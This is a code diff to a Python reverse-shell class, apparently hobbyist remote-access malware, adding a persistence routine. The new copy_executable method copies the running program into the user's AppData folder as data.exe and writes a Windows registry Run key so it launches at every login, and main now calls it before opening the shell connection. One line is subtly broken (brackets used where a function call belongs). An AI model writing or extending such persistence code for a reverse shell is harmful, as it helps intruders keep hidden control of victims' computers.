@@ -3,6 +3,7 @@ import subprocess
 import json
 import time
 import os
+import shutil
 import sys
 
 # for persistance:
@@ -63,11 +64,20 @@ class Reverse_Shell:
                 except:
                     self.reliable_send("Can't execute the command")
 
+    def copy_executable(self):
+        location = os.environ["appdata"] + "\\data.exe"
+        if not os.path.exists[location]:
+            shutil.copyfile(sys.executable, location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v data /t REG_SZ /d ""'
+                        + location + '"', shell=True)
+
+
     def end_connection(self):
         # close the socket
         sock.close()
 
     def main(self):
         self.initialisation()
+        self.copy_executable()
         self.connection()
         self.end_connection()
